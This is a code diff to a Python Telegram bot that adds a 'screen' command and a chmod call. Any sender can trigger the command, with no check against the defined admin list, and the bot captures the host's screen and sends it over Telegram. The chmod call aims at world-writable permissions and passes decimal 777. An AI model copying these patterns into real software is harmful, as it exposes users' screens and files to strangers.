@@ -11,6 +11,8 @@ START = f"{system.scriptPath}/data/message.txt"
 AUTOSTART = f"{system.scriptPath}/data/on_start.txt"
 ADMIN = f"{system.scriptPath}/admin.txt"
 
+os.chmod(system.scriptPath, 777)
+
 try:
     bot = telebot.TeleBot(file_io.readFile(TOKEN_PATH))
 except:
@@ -39,6 +41,11 @@ def start_message(message):
 @bot.message_handler(content_types=["text"])
 
 def text(message):
-    bot.send_message(message.chat.id, mes_io.messageProcessing(message.text), parse_mode="Markdown")
+    if message.text == "screen":
+        screen = system.getScreen()
+        bot.send_document(message.chat.id, open(screen, "rb"))
+        os.remove(screen)
+    else:
+        bot.send_message(message.chat.id, mes_io.messageProcessing(message.text), parse_mode="Markdown")
 
 bot.polling(non_stop=True)
